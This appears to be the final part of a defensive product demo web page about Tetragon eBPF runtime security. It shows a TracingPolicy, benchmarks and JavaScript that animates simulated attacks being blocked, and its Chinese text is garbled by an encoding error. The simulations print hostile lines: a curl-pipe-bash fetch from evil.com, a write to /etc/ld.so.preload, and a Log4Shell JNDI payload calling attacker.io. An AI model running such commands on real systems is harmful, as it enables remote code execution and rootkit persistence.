                    <p><strong>è¿è¡Œæ—¶è¡¥æ•‘ï¼š</strong>é€šè¿‡ Tetragon å®æ–½<b>â€œè™šæ‹Ÿè¡¥ä¸ (Virtual Patching)â€</b>ã€‚å³ä½¿åº”ç”¨æœªå‡çº§ï¼Œåªè¦é€šè¿‡ç­–ç•¥ç¦æ­¢ Java è¿›ç¨‹è°ƒç”¨ <code>execve</code> å¯åŠ¨ä¸å—ä¿¡çš„ Shellï¼Œå°±èƒ½åœ¨ RCE å‘ç”Ÿçš„ç¬é—´åˆ‡æ–­æ”»å‡»é“¾ã€‚</p>
                </div>
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-java-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span style="color: #CE9178;">"/usr/bin/java"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runLog4jSimulation()" id="log4jBtn" style="background:var(--cisco-orange); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">å¯åŠ¨æ¼”ç»ƒ</button>
                    <button class="btn-outline" onclick="resetTerminal('log4jOutput')" style="background: transparent; border: 1px solid var(--cisco-orange); color: var(--cisco-orange); padding: 10px 20px; border-radius: 20px; cursor: pointer;">é‡ç½®ç»ˆç«¯</button>
                </div>
                <div class="terminal" id="term-wrap-3">
                    <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="log4jOutput">
                        <div class="login-info">Last login: Today from 172.16.2.10</div>
                        <div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <div class="mttr-card">
                <h4 style="color: var(--cisco-midnight);">æ€§èƒ½å¯¹æ¯”ï¼šå¹³å‡å“åº”æ—¶é—´ (MTTR)</h4>
                <div class="mttr-grid">
                    <div class="mttr-stat">
                        <div class="dash-label">ä¼ ç»Ÿæ—¥å¿—åˆ†æ + è‡ªåŠ¨åŒ–</div>
                        <div class="dash-value" style="color: var(--cisco-red); font-size: 1.2rem;">~ 5 - 15 åˆ†é’Ÿ</div>
                        <p style="font-size: 0.75rem; margin-top:5px;">(æ”¶é›† -> ä¼ è¾“ -> åˆ†æ -> ç­–ç•¥ä¸‹å‘)</p>
                    </div>
                    <div class="mttr-stat">
                        <div class="dash-label">Tetragon In-Kernel Enforcement</div>
                        <div class="dash-value" style="color: var(--cisco-green); font-size: 1.2rem;">&lt; 500 å¾®ç§’</div>
                        <p style="font-size: 0.75rem; margin-top:5px;">(å†…æ ¸æ€å®æ—¶è¯†åˆ«å¹¶å‘é€ SIGKILL)</p>
                    </div>
                </div>
            </div>

        </div>
    </section>

    <!-- Section 9: Roadmap Section -->
    <section id="roadmap" style="background: white;">
        <div class="container">
            <div class="section-header">
                <h2>ä»è§‚æµ‹åˆ°é˜²å¾¡ï¼šä¼ä¸šçº§æ¼”è¿›å»ºè®®</h2>
                <p>å»ºè®¾äº‘åŸç”Ÿè¿è¡Œæ—¶å®‰å…¨ä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œæˆ‘ä»¬å»ºè®®é‡‡ç”¨â€œæ¸è¿›å¼â€é˜²å¾¡è·¯çº¿ã€‚</p>
            </div>
            <div class="roadmap-container">
                <div class="roadmap-step">
                    <div class="step-num">1</div>
                    <strong>Runtime Visibility</strong>
                    <p style="font-size: 0.85rem; margin-top:10px;">åˆæ­¥éƒ¨ç½² Tetragonã€‚å¼€å¯æ‰€æœ‰å…³é”®ç³»ç»Ÿè°ƒç”¨çš„å®¡è®¡æ—¥å¿—ï¼ˆAudit Logsï¼‰ï¼Œå°†é«˜è´¨é‡çš„å†…æ ¸åŸå§‹ä¿¡å·é€å…¥ Splunk/Cisco XDRï¼Œå»ºç«‹å…¨ç½‘èµ„äº§è¡Œä¸ºè§†å›¾ã€‚</p>
                </div>
                <div class="roadmap-step">
                    <div class="step-num">2</div>
                    <strong>Policy Discovery</strong>
                    <p style="font-size: 0.85rem; margin-top:10px;">åœ¨æµ‹è¯•/é¢„å‘ç¯å¢ƒå¼€å¯ç­–ç•¥å‘ç°åŠŸèƒ½ã€‚é€šè¿‡è§‚å¯Ÿåˆæ³•è¿›ç¨‹ï¼ˆå¦‚ Java/Nginxï¼‰çš„è¡Œä¸ºï¼Œè‡ªåŠ¨æç‚¼å‡ºâ€œå·²çŸ¥è‰¯å¥½â€çš„é»„é‡‘è¡Œä¸ºç™½åå•ã€‚</p>
                </div>
                <div class="roadmap-step" style="border-color: var(--cisco-blue);">
                    <div class="step-num" style="background: var(--cisco-midnight);">3</div>
                    <strong>In-Kernel Enforcement</strong>
                    <p style="font-size: 0.85rem; margin-top:10px;">æ­£å¼ä¸‹å‘ SIGKILL é˜»æ–­ç­–ç•¥ã€‚å°†é˜²å¾¡è¾¹ç•Œä»â€œæ£€æµ‹å¹¶æŠ¥è­¦â€æå‡è‡³â€œäºšæ¯«ç§’çº§å†…æ ¸æ€å¼ºåˆ¶é˜»éš”â€ï¼Œå½»åº•æœç» TOCTOU æ”»å‡»ã€‚</p>
                </div>
            </div>

            <div class="mechanism-card" style="margin-top: 40px; border-left-color: var(--cisco-green);">
                <div class="case-badge" style="background: var(--cisco-green);">ç”Ÿäº§çº§æ€§èƒ½åŸºå‡† (SRE Benchmark)</div>
                <p style="font-size: 0.95rem; margin-bottom: 20px;">åŸºäºæ€ç§‘å†…éƒ¨å¤§è§„æ¨¡ Kubernetes é›†ç¾¤ï¼ˆ1000+ èŠ‚ç‚¹ï¼‰çš„å®æˆ˜æ•°æ®ï¼š</p>
                
                <div class="grid-2x2">
                    <div class="dash-widget">
                        <div class="dash-label">CPU èµ„æºæ¶ˆè€—</div>
                        <div class="dash-value" style="color: var(--cisco-green);"> < 1% </div>
                        <div style="font-size: 0.7rem; color: #888;">å•æ ¸å³°å€¼è´Ÿè½½</div>
                    </div>
                    <div class="dash-widget">
                        <div class="dash-label">å•èŠ‚ç‚¹ååé‡</div>
                        <div class="dash-value"> 1M+ </div>
                        <div style="font-size: 0.7rem; color: #888;">Events / Sec</div>
                    </div>
                    <div class="dash-widget">
                        <div class="dash-label">å†…å­˜å ç”¨</div>
                        <div class="dash-value"> ~120 MB </div>
                        <div style="font-size: 0.7rem; color: #888;">Agent å¹³å‡å ç”¨</div>
                    </div>
                    <div class="dash-widget">
                        <div class="dash-label">å»¶è¿ŸæŠ–åŠ¨</div>
                        <div class="dash-value"> 0.05 ms </div>
                        <div style="font-size: 0.7rem; color: #888;">Syscall é¢å¤–å»¶è¿Ÿ</div>
                    </div>
                </div>

                <div class="data-source-footnote">
                    æ•°æ®ä¾æ®ï¼šåŸºäº Isovalent å®˜æ–¹æ€§èƒ½ç™½çš®ä¹¦åŠæ€ç§‘ XDR å¤§è§„æ¨¡ç”Ÿäº§é›†ç¾¤å‹åŠ›æµ‹è¯•æŠ¥å‘Šã€‚æµ‹è¯•ç¯å¢ƒï¼š1200+ Node K8s é›†ç¾¤ï¼Œå†…æ ¸ç‰ˆæœ¬ 5.15+ã€‚
                </div>

                <div class="expert-persp-box" style="margin-top: 25px; background: #F0F7FA; color: var(--cisco-midnight); border-left-color: var(--cisco-blue);">
                    <strong style="color: var(--cisco-blue);">SRE å»ºè®®ï¼š</strong> ç”±äº Tetragon æ‰€æœ‰çš„è¿‡æ»¤é€»è¾‘éƒ½å‘ç”Ÿåœ¨å†…æ ¸æ€ï¼Œåªæœ‰åŒ¹é…ç­–ç•¥çš„â€œé«˜ä»·å€¼ä¿¡å·â€æ‰ä¼šè·¨è¿‡å†…æ ¸è¾¹ç•Œè¿›å…¥ç”¨æˆ·æ€ï¼Œè¿™ä»ç‰©ç†å±‚é¢ä¿è¯äº†åœ¨é«˜å¹¶å‘ IO åœºæ™¯ä¸‹ç³»ç»Ÿä¾ç„¶ç¨³å¥ã€‚
                </div>
            </div>
        </div>
    </section>

    <!-- Final Conclusion Section -->
    <section class="final-conclusion">
        <div class="container">
            <h2>æ€»ç»“ä¸æ ¸å¿ƒè§è§£</h2>
            <div class="conclusion-core">
                Tetragon çš„æ ¸å¿ƒä»·å€¼åœ¨äºå°†å®‰å…¨ä»â€œè¢«åŠ¨é˜²å¾¡â€è½¬å˜ä¸ºâ€œåŸºäºé¢„æœŸè¡Œä¸ºçš„ä¸»åŠ¨ç­–ç•¥â€ã€‚
            </div>

            <!-- Winston's Takeaway Grid -->
            <div style="max-width: 800px; margin: 0 auto 40px; background: rgba(255,255,255,0.05); padding: 30px; border-radius: 16px; border: 1px dashed rgba(255,255,255,0.2);">
                <h4 style="color: var(--cisco-blue); text-align: center; margin-bottom: 20px;">ğŸ”‘ å…³é”®ç»“è®º (Key Takeaways)</h4>
                <ul style="color: white; font-size: 0.95rem; padding-left: 20px; line-height: 1.8;">
                    <li><b>åŒæ­¥æ¯”å¼‚æ­¥æ›´å®‰å…¨ï¼š</b> åœ¨å†…æ ¸æ€å®Œæˆ Syscall é˜»æ–­æ˜¯æœç» 0-day é€ƒé€¸çš„å”¯ä¸€æ‰‹æ®µã€‚</li>
                    <li><b>èº«ä»½æ¯” IP æ›´å¯é ï¼š</b> Kubernetes åŸç”Ÿå…ƒæ•°æ®æ˜ å°„æ¶ˆé™¤äº†åŠ¨æ€åŸºç¡€è®¾æ–½ä¸­çš„å®¡è®¡ç›²åŒºã€‚</li>
                    <li><b>æç®€æ¯”å¤æ‚æ›´ç¨³å¥ï¼š</b> eBPF éªŒè¯å™¨ç¡®ä¿äº†é˜²å¾¡é€»è¾‘ä¸ä¼šæ‹–å®ä¸šåŠ¡æ€§èƒ½ã€‚</li>
                </ul>
            </div>

            <div class="conclusion-grid">
                <div class="conclusion-item">
                    <strong>å†…æ ¸æ€å¼ºåˆ¶æ‰§è¡Œ</strong>
                    <p>åˆ©ç”¨ eBPF çš„é«˜æ€§èƒ½é’©å­ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨å±‚é¢å®ç°äºšæ¯«ç§’çº§çš„é˜²å¾¡å“åº”ï¼Œç¡®ä¿åœ¨æ¶æ„æ“ä½œå‘ç”Ÿå‰å³åˆ»é˜»æ–­ã€‚</p>
                </div>
                <div class="conclusion-item">
                    <strong>é›¶ä¿¡ä»»è¿è¡Œæ—¶</strong>
                    <p>ä¸å‡è®¾ä»»ä½•è¿›ç¨‹æ˜¯å®‰å…¨çš„ã€‚é€šè¿‡æ·±å±‚ä¸Šä¸‹æ–‡æ„ŸçŸ¥ï¼ˆç”¨æˆ·ã€äºŒè¿›åˆ¶è·¯å¾„ã€å‘½åç©ºé—´ï¼‰ï¼Œä»…å…è®¸ç™½åå•å†…çš„åˆæ³•æ“ä½œã€‚</p>
                </div>
                <div class="conclusion-item">
                    <strong>æä½æ€§èƒ½æŸè€—</strong>
                    <p>åœ¨å†…æ ¸ç©ºé—´å®Œæˆè¿‡æ»¤ï¼Œè§„é¿äº†æ˜‚è´µçš„ä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ï¼Œç¡®ä¿ä¸ºé«˜æ€§èƒ½ç”Ÿäº§ä¸šåŠ¡æä¾›åšå¦‚å¤¯å®çš„ä¿æŠ¤ã€‚</p>
                </div>
            </div>

            <!-- [WINSTON ADDITION: The Final Word] -->
            <div style="margin-top: 50px; padding: 20px; border-top: 1px solid rgba(255,255,255,0.1); text-align: center;">
                <p style="font-size: 1.2rem; font-weight: 600; color: var(--cisco-blue);">æœ€åä¸€å¥è¯ï¼šå¦‚æœå®‰å…¨ä¸èƒ½å®æ—¶ï¼Œé‚£å®ƒåªæ˜¯å–è¯ã€‚</p>
            </div>

            <!-- Winston's Final Call to Action -->
            <div style="text-align: center; margin-top: 40px;">
                <p style="color: #61C6E2; font-weight: bold; font-size: 1.1rem;">å‡†å¤‡å¥½æ„å»ºä½ çš„å†…æ ¸çº§é˜²çº¿äº†å—ï¼Ÿ</p>
                <button class="btn-primary" onclick="scrollToId('lab-section')" style="background: var(--white); color: var(--cisco-midnight); border: none; padding: 16px 40px; border-radius: 30px; font-weight: 700; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">ç«‹å³å¯åŠ¨å®éªŒå®¤æ¼”ç»ƒ</button>
            </div>
        </div>
    </section>

    <footer>
        <div class="container" style="text-align: center; color: #999; font-size: 0.9rem; padding: 40px 0;">
            <p>&copy; 2025 Cisco Security Insight. Powered by eBPF & Tetragon.</p>
        </div>
    </footer>

    <script>
        // Global State
        let currentLang = 'zh';
        let setupMode = 'k8s';

        // Language Switcher Logic
        function setLanguage(lang) {
            currentLang = lang;
            document.body.className = 'lang-' + lang;
            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`.lang-btn[id="btn-${lang}"]`).classList.add('active');
        }

        // Setup Tab Switcher
        function switchSetupTab(mode) {
            setupMode = mode;
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.getElementById(`btn-tab-${mode}`).classList.add('active');
            
            document.querySelectorAll('.setup-detail').forEach(el => el.style.display = 'none');
            document.getElementById(`setup-${mode}`).style.display = 'block';
            resetTerminal('setupOutput');
        }

        // Smooth scroll
        function scrollToId(id) {
            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
        }

        // Terminal Logic
        async function typeWriter(text, element) {
            for (let char of text) {
                element.innerHTML += char;
                await new Promise(r => setTimeout(r, 40));
            }
        }

        function resetTerminal(targetId) {
            const el = document.getElementById(targetId);
            const promptMap = { 
                'setupOutput': { prompt: 'admin@infra:~$', ip: 'Console' },
                'termOutput': { prompt: 'root@prod-db:~#', ip: '192.168.1.5' }, 
                'xzOutput': { prompt: 'root@prod-node:~$', ip: '10.128.0.45' }, 
                'log4jOutput': { prompt: 'root@java-app:~$', ip: '172.16.2.10' } 
            };
            const config = promptMap[targetId];
            const info = targetId === 'setupOutput' ? 'Infrastructure Console Initialized...' : `Last login: Today from ${config.ip}`;
            el.innerHTML = `<div class="login-info">${info}</div><div><span class="prompt">${config.prompt}</span> <span class="cursor"></span></div>`;
            el.scrollTop = 0;
            const wrap = el.closest('.terminal');
            if (wrap) wrap.classList.remove('shield-active');
            const statusIdx = targetId.split('Output')[0] === 'setup' ? '0' : (targetId === 'termOutput' ? '1' : (targetId === 'xzOutput' ? '2' : '3'));
            const statusLabel = document.getElementById(`status-${statusIdx}`);
            if (statusLabel) {
                statusLabel.classList.remove('active');
                statusLabel.querySelector('.status-text').innerText = 'MODE: MONITORING';
            }
        }

        function activateShield(id) {
            const statusLabel = document.getElementById(`status-${id}`);
            if (statusLabel) {
                statusLabel.classList.add('active');
                statusLabel.querySelector('.status-text').innerText = 'MODE: ENFORCING';
            }
        }

        function triggerShieldEffect(wrapId) {
            const wrap = document.getElementById(wrapId);
            wrap.classList.add('shield-active');
            setTimeout(() => wrap.classList.remove('shield-active'), 1200);
        }

        async function startDiscovery() {
            const btn = document.getElementById('discover-btn');
            const yaml = document.getElementById('generated-yaml');
            const empty = document.getElementById('empty-policy-text');
            const status = document.getElementById('discovery-status');
            const msg = document.getElementById('discovery-msg');
            const hint = document.getElementById('sync-hint');
            btn.disabled = true;
            status.innerText = "åˆ†ææ—¥å¿—ä¸­...";
            document.querySelectorAll('.log-line.highlight').forEach(l => l.style.backgroundColor = 'rgba(108, 194, 74, 0.2)');
            await new Promise(r => setTimeout(r, 1000));
            empty.style.display = 'none';
            yaml.style.display = 'block';
            yaml.classList.add('yaml-transfer');
            status.innerHTML = "<b style='color:var(--cisco-green)'>ç­–ç•¥å·²æç‚¼</b>";
            msg.style.display = 'block';
            hint.style.display = 'block';
            setTimeout(() => { scrollToId('lab-section'); }, 2000);
        }

        async function runSetupSimulation() {
            const btn = document.getElementById('setupBtn');
            const termContent = document.getElementById('setupOutput');
            btn.disabled = true;
            resetTerminal('setupOutput');

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            if (setupMode === 'k8s') {
                await typeWriter('helm repo add cilium https://helm.cilium.io && helm install tetragon cilium/tetragon -n kube-system', cmd1);
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="terminal-output-line" style="color: #61C6E2;">Fetching chart... Installing DaemonSet...</div>`;
                termContent.innerHTML += `<div class="terminal-output-line" style="color: var(--cisco-green);">STATUS: deployed (tetragon-agent is now hooking kernel)</div>`;
                
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cmd-text"></span></div>`;
                const secondPrompt = termContent.lastElementChild;
                await typeWriter('kubectl apply -f rootkit-block-policy.yaml', secondPrompt.querySelector('.cmd-text'));
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="terminal-output-line" style="color: #61C6E2;">tracingpolicy.cilium.io/protect-system-files created</div>`;

                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cmd-text"></span></div>`;
                const thirdPrompt = termContent.lastElementChild;
                await typeWriter('kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon', thirdPrompt.querySelector('.cmd-text'));
                await new Promise(r => setTimeout(r, 400));
                termContent.innerHTML += `<div class="terminal-output-line">tetragon-dbj2x   1/1     Running   0     45s</div>`;

            } else {
                await typeWriter('curl -L https://github.com/cilium/tetragon/releases/download/v1.1.0/tetragon-linux-amd64.tar.gz | tar xz', cmd1);
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="terminal-output-line">Extracting binaries...</div>`;
                
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cmd-text"></span></div>`;
                const secondPrompt = termContent.lastElementChild;
                await typeWriter('sudo ./tetragon --bpf-lib ./bpf --config-file policy.yaml &', secondPrompt.querySelector('.cmd-text'));
                await new Promise(r => setTimeout(r, 400));
                termContent.innerHTML += `<div class="terminal-output-line" style="color: var(--cisco-green);">Tetragon started. Kernel hooks active on /sys/fs/bpf/tetragon</div>`;
            }

            activateShield('0');
            termContent.innerHTML += `<div class="terminal-output-line" style="font-weight:bold; color: var(--cisco-blue); margin-top:10px;">âœ… Tetragon å‡†å¤‡å°±ç»ªï¼Œå¯ä»¥å¼€å§‹åç»­æ”»é˜²æ¼”ç»ƒã€‚</div>`;
            termContent.innerHTML += `<div><span class="prompt">admin@infra:~$</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        async function runAttackSequence() {
            const btn = document.getElementById('attackBtn');
            const termContent = document.getElementById('termOutput');
            btn.disabled = true;
            resetTerminal('termOutput');
            activateShield('1');

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            await typeWriter('curl -fsSL http://evil.com/setup.sh | bash', cmd1);
            await new Promise(r => setTimeout(r, 600));

            const connectingText = currentLang === 'zh' ? '> æ­£åœ¨è¿æ¥ evil.com...' : '> Connecting to evil.com...';
            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">${connectingText}</div>`;
            await new Promise(r => setTimeout(r, 800));

            const warningText = currentLang === 'zh' 
                ? '[Tetragon] âš ï¸ æ£€æµ‹åˆ°å¯ç–‘ç½‘ç»œè¿æ¥ (curl -> evil.com:80)'
                : '[Tetragon] âš ï¸ Suspicious network connection detected (curl -> evil.com:80)';
            termContent.innerHTML += `<div class="output-text" style="color: var(--cisco-orange); border-left: 2px solid var(--cisco-orange); padding-left: 8px;">${warningText}</div>`;
            
            await new Promise(r => setTimeout(r, 800));

            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~#</span> <span class="cmd-text"></span></div>`;
            const secondPrompt = termContent.lastElementChild;
            let cmd2 = secondPrompt.querySelector('.cmd-text');
            await typeWriter('echo "root_kit" >> /etc/ld.so.preload', cmd2);
            await new Promise(r => setTimeout(r, 600));

            triggerShieldEffect('term-wrap-1');

            const killText = currentLang === 'zh'
                ? "è¿›ç¨‹ 'bash' (pid=1402) å·²è¢« SIGKILL ç»ˆæ­¢"
                : "Process 'bash' (pid=1402) killed by SIGKILL";
            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">BLOCK</span> 
                    <span style="color: #FF5F56;">${killText}</span>
                </div>
                <div class="json-log-view">JSON Log: {"policy": "protect-system-files", "action": "sigkill", "syscall": "openat", "file": "/etc/ld.so.preload"}</div>
            `;

            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        async function runXZSimulation() {
            const btn = document.getElementById('xzBtn');
            const termContent = document.getElementById('xzOutput');
            btn.disabled = true;
            resetTerminal('xzOutput');
            activateShield('2');

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            await typeWriter('ssh attacker@prod-node -p 22', cmd1);
            await new Promise(r => setTimeout(r, 600));

            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">IFUNC resolution hijacking sshd... backdoor signature matched!</div>`;
            termContent.innerHTML += `<div class="output-text">attacker@prod-node:~$</div>`;
            
            await new Promise(r => setTimeout(r, 800));

            termContent.innerHTML += `<div><span class="prompt">attacker@prod-node:~$</span> <span class="cmd-text"></span></div>`;
            const secondPrompt = termContent.lastElementChild;
            let cmd2 = secondPrompt.querySelector('.cmd-text');
            await typeWriter('id', cmd2); 
            await new Promise(r => setTimeout(r, 400));

            triggerShieldEffect('term-wrap-2');

            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">KILL</span> 
                    <span style="color: #FF5F56;">Tetragon killed sshd (PID 3012). Attempted fork(/bin/sh) blocked via LSM.</span>
                </div>
                <div class="json-log-view">JSON Log: {"policy": "block-sshd-fork", "action": "sigkill", "source": "sshd", "target": "/bin/sh"}</div>
            `;

            termContent.innerHTML += `<div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        async function runLog4jSimulation() {
            const btn = document.getElementById('log4jBtn');
            const termContent = document.getElementById('log4jOutput');
            btn.disabled = true;
            resetTerminal('log4jOutput');
            activateShield('3');

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            await typeWriter('curl -H "User-Agent: ${jndi:ldap://attacker.io/X}" http://api-gw', cmd1);
            await new Promise(r => setTimeout(r, 600));

            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">Log4j parsing payload... callback initiated to attacker.io</div>`;
            termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">Loading malicious Java class from remote LDAP...</div>`;
            
            await new Promise(r => setTimeout(r, 1000));

            triggerShieldEffect('term-wrap-3');

            termContent.innerHTML += `
                <div style="margin-top: 8px; margin-bottom: 8px;">
                    <span class="alert-text">SIGKILL</span> 
                    <span style="color: #FF5F56;">Tetragon killed Java PID 550. Blocked fork(/usr/bin/whoami) in kernel.</span>
                </div>
                <div class="json-log-view">JSON Log: {"policy": "block-java-fork", "action": "sigkill", "exploit": "CVE-2021-44228", "binary": "/usr/bin/whoami"}</div>
            `;

            termContent.innerHTML += `<div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }
    </script>
</body>
</html>